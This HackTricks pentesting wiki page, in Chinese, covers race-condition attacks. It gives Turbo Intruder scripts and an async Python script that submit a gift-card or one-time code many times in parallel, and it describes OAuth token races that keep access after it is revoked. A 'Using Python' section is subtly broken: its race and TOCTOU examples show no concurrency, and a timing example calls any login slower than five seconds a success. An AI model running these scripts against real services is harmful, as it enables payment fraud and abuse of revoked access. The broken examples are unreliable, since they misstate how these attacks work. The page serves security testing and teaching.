# 竞争条件

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 限制尝试次数的任何事物

竞争条件是出现在**限制您执行某个操作次数**的网站中的**漏洞**。一个非常简单的例子可以在[**这份报告**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)中找到。

## 多次使用一次性代码

当您让网页执行一些**只应该执行一次**的**操作**，但如果该操作被**多次执行**，您将会受益，那么您确实需要尝试一下**竞争条件**。\
大多数情况下，这与**金钱**直接相关（如果执行某个操作，您将获得X金额，因此让我们尝试以非常快的速度多次执行它）。

### **使用同一账户多次使用相同的代码**

例如，在[**这个漏洞**](https://hackerone.com/reports/759247)中，猎人能够**多次加载礼品卡中的金额**。

这是用于**测试**上述报告中的**竞争条件**的**turbo intruder**脚本：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=30,
requestsPerConnection=30,
pipeline=False
)

for i in range(30):
engine.queue(target.req, i)
engine.queue(target.req, target.baseInput, gate='race1')


engine.start(timeout=5)
engine.openGate('race1')

engine.complete(timeout=60)


def handleResponse(req, interesting):
table.add(req)
```
使用BURP，你也可以将请求发送到Intruder，将选项菜单中的线程数设置为30，并选择Null payloads作为有效载荷，生成30个。

### 使用不同账户的相同代码

如果之前的方法不起作用（尝试多次使用相同账户的相同代码），你可以尝试以下变体：尝试使用不同账户的相同代码：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
### 使用Python

Race conditions（竞态条件）是一种常见的安全漏洞，可以在并发操作中导致不可预测的结果。在Web应用程序中，竞态条件可能会导致用户越权访问、数据损坏或其他安全问题。

Python是一种功能强大的编程语言，可以用于编写自动化脚本来模拟竞态条件。以下是使用Python进行竞态条件攻击的一些常见技术：

#### 1. Time of Check to Time of Use (TOCTOU) Attacks（检查时间到使用时间的攻击）

TOCTOU攻击利用了在检查某个条件和使用该条件之间的时间间隙。攻击者可以通过在这个时间间隙内修改条件来实现越权访问或执行未授权的操作。

以下是一个使用Python进行TOCTOU攻击的示例：

```python
import os

def check_file_exists(filename):
    if os.path.exists(filename):
        return True
    else:
        return False

def read_file(filename):
    if check_file_exists(filename):
        with open(filename, 'r') as file:
            data = file.read()
            return data
    else:
        return None

def write_file(filename, data):
    with open(filename, 'w') as file:
        file.write(data)

# 攻击者在检查文件存在性和读取文件之间修改了文件
filename = 'example.txt'
write_file(filename, 'Hello, World!')

data = read_file(filename)
print(data)
```

在上面的示例中，攻击者在检查文件存在性和读取文件之间修改了文件内容。这可能导致读取到未经授权的数据。

#### 2. Race Condition Exploitation（竞态条件利用）

竞态条件利用是一种利用竞态条件漏洞的攻击技术。攻击者通过在竞态条件发生时执行恶意操作来实现攻击目标。

以下是一个使用Python进行竞态条件利用的示例：

```python
import os
import time

def transfer_funds(amount, from_account, to_account):
    # 检查账户余额
    if get_balance(from_account) >= amount:
        # 扣除转出账户的金额
        decrease_balance(from_account, amount)
        # 增加转入账户的金额
        increase_balance(to_account, amount)
        print("Funds transferred successfully!")
    else:
        print("Insufficient funds!")

def get_balance(account):
    # 模拟获取账户余额的操作
    time.sleep(1)
    return 1000

def decrease_balance(account, amount):
    # 模拟扣除账户金额的操作
    time.sleep(1)

def increase_balance(account, amount):
    # 模拟增加账户金额的操作
    time.sleep(1)

# 攻击者同时发起两个转账请求
amount = 500
from_account = 'Alice'
to_account = 'Bob'

transfer_funds(amount, from_account, to_account)
transfer_funds(amount, from_account, to_account)
```

在上面的示例中，攻击者同时发起两个转账请求。由于竞态条件的存在，可能导致转账金额超过账户余额。

#### 3. Time-Based Attacks（基于时间的攻击）

基于时间的攻击利用了程序在不同条件下执行所需的时间差异。攻击者可以通过测量执行时间来推断出敏感信息或执行其他恶意操作。

以下是一个使用Python进行基于时间的攻击的示例：

```python
import requests
import time

def login(username, password):
    start_time = time.time()
    response = requests.post('https://example.com/login', data={'username': username, 'password': password})
    end_time = time.time()
    elapsed_time = end_time - start_time

    if elapsed_time > 5:
        print("Login successful!")
    else:
        print("Login failed!")

# 攻击者通过测量登录请求的执行时间来判断密码是否正确
username = 'admin'
password = 'password'

login(username, password)
```

在上面的示例中，攻击者通过测量登录请求的执行时间来判断密码是否正确。如果执行时间超过5秒，则认为登录成功。

以上是使用Python进行竞态条件攻击的一些常见技术。请记住，在进行任何形式的攻击时，始终遵守法律和道德准则。
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## OAuth2永久持久性

有几个[**OAuth提供者**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers)。这些服务将允许您创建一个应用程序并验证提供者注册的用户。为了做到这一点，**客户端**将需要**允许您的应用程序**访问**OAuth提供者**内部的一些数据。\
所以，到目前为止，只是一个常见的登录方式，使用google/linkdin/github等，您会看到一个页面，上面写着：“_应用程序\<InsertCoolName>想要访问您的信息，您是否允许？_”

#### `authorization_code`中的竞争条件

**问题**出现在您**接受**并自动发送一个**`authorization_code`**给恶意应用程序时。然后，该应用程序滥用OAuth服务提供者中的竞争条件，从**`authorization_code`**为您的帐户生成多个AT/RT（_身份验证令牌/刷新令牌_）。基本上，它将滥用您已经允许应用程序访问您的数据的事实，来**创建多个帐户**。然后，如果您**停止允许应用程序访问您的数据，一个AT/RT对将被删除，但其他对仍然有效**。

#### `Refresh Token`中的竞争条件

一旦您**获得了有效的RT**，您可以尝试**滥用它来生成多个AT/RT**，即使用户取消了恶意应用程序访问其数据的权限，**多个RT仍然有效**。

## 参考资料

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本**或下载PDF格式的HackTricks吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具驱动。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
